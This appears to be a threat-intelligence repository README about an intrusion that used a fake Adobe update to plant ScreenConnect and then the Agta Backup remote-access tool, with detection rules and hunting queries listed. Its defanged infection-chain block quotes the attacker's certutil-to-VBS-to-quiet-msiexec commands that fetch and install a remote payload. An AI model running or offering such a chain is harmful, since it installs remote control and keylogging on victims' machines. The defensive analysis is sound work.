# agta-strikes-again

Blog post: https://blueteam.cool/posts/agta-strikes-again/

## Summary

A second intrusion involving Agta Backup, a custom .NET 8 remote-access tool
first seen in the fake Webex multi-RMM campaign. A genuine Google share link
redirected the user to `file.briefnote[.]pw`, which presented a "Ready when
you are" browser gate and then a fake "Adobe Acrobat Reader DC Update Required"
page. The download, `Ądobe-Acrobat-Reader-V16.8.msi` (leading U+0104), installed
a genuine ConnectWise-signed ScreenConnect client enrolled into the attacker's
tenant (instance `09232f3c6735cf46`, relay `aprilenoxpresolve[.]org:8041`).

The next day the operator used ScreenConnect to run a batch file that decoded
a Base64 file with `certutil` into `kRPdm.vbs` and ran it. The VBS rebuilds a
URL from an out-of-order fragment array, relaunches itself hidden via
`cscript`, and runs `msiexec /i hxxps://planetspaceretireforthree[.]top/AgtaBackupAgent.msi /qn /norestart`.
Agta then ran as the hidden service `AgtaBackupAgentSvc` with one-minute
self-heal tasks, and started its keylogger and screen-stream engine in the
user's session.

Three Agta binaries on the host are byte-identical to the Webex-campaign build;
the ScreenConnect tenant, relay, lure and C2 are all different. The post also
covers the Agta panel network as catalogued on 2026-09-09: 66 live panels
across 27 ASNs, three managed versions.

```text
share link (google redirector) -> file.briefnote[.]pw gate -> fake Adobe update
  -> Ądobe-Acrobat-Reader-V16.8.msi -> ScreenConnect (attacker tenant)
  -> [next day] ScreenConnect -> cmd /c Passwordprompt.bat
       -> certutil -decode cztFr.b64 kRPdm.vbs -> wscript kRPdm.vbs
       -> cscript //B kRPdm.vbs /elevate (runas, hidden)
       -> msiexec /i hxxps://planetspaceretireforthree[.]top/AgtaBackupAgent.msi /qn
  -> AgtaBackupAgentSvc (Credential Guard.exe) -> keylogger + stream in user session
```

## What is included

| File | Description |
|------|-------------|
| `iocs.csv` | Incident network/host IOCs, Agta agent hashes and artifacts, panel fingerprint, and all 66 live panel domains + 65 panel IPs (2026-09-09). Network IOCs defanged |
| `rule.yar` | `Agta_VBS_FragmentArray_MSI_Stager` (the VBS stager) and `Agta_Backup_Panel_Response` (panel HTTP response) |
| `sigma-certutil-decode-script-temp.yml` | certutil decoding Base64 into a script file |
| `sigma-scripthost-msiexec-url.yml` | cscript/wscript launching a quiet msiexec install from a URL |
| `kql.md` | Defender XDR / Sentinel hunts: panel IPs/domains, version endpoint, service/tasks, install paths, ScreenConnect -> certutil, script host -> msiexec, unsanctioned ScreenConnect instances, keylog-folder icacls |
| `validation/` | Re-validation script, raw JSON and panel bundle behind the panel-network figures |

## Coverage notes

### What these detections cover

- The hands-on-keyboard step (ScreenConnect -> certutil -> VBS -> msiexec).
- The VBS stager by structure, independent of the domain it carries.
- Agta on the endpoint: service, tasks, paths, the five known component hashes, the keylog-folder permission change.
- Agta panels by HTTP fingerprint and by the 2026-09-09 domain/IP set.

### What they do NOT cover

- The fake Adobe MSI itself: it is a thin wrapper around the genuine ScreenConnect installer, so there is no malicious code to sign on. Use the hash, the instance ID and the relay.
- The contents of `Passwordprompt.bat` and `cztFr.b64` (not collected).
- Panels stood up after 2026-09-09 other than this incident's C2.
- Agta agent binaries on disk by YARA: they are .NET single-file bundles with compressed managed code, so string rules against the EXE are unreliable. Use hashes and behaviour.

## False-positive notes

- `Agta_VBS_FragmentArray_MSI_Stager`: requires the array pattern plus msiexec quiet install plus self-relaunch; not expected in legitimate scripts.
- `Agta_Backup_Panel_Response`: title fragments or bundle names are specific; none known.
- `sigma-certutil-decode-script-temp`: rare admin scripting that stages scripts via certutil. Check the parent.
- `sigma-scripthost-msiexec-url`: legacy deployment scripts installing from internal web servers. Allowlist those hosts.
- KQL 10 (ScreenConnect instances): will fire on every legitimate ScreenConnect you haven't added to the allowlist - that's the point, but expect a first-run inventory exercise.
- KQL 7 (cheap-TLD egress): broad, noisy by design.

## Confidence

High for the chain from ScreenConnect onward: EDR process telemetry, the
decoded VBS, and SHA-256 matches against the previously extracted Agta build.
Lab execution of the MSI (verbose MSI logging) confirmed it installs the same
ScreenConnect instance seen on the victim. Panel figures are as observed on
2026-09-09.

## Related detections

- [iocs.csv](iocs.csv)
- [rule.yar](rule.yar)
- [sigma-certutil-decode-script-temp.yml](sigma-certutil-decode-script-temp.yml)
- [sigma-scripthost-msiexec-url.yml](sigma-scripthost-msiexec-url.yml)
- [kql.md](kql.md)
- [validation/](validation/)
- Earlier campaign: [fake-webex-multi-rmm](../fake-webex-multi-rmm/)
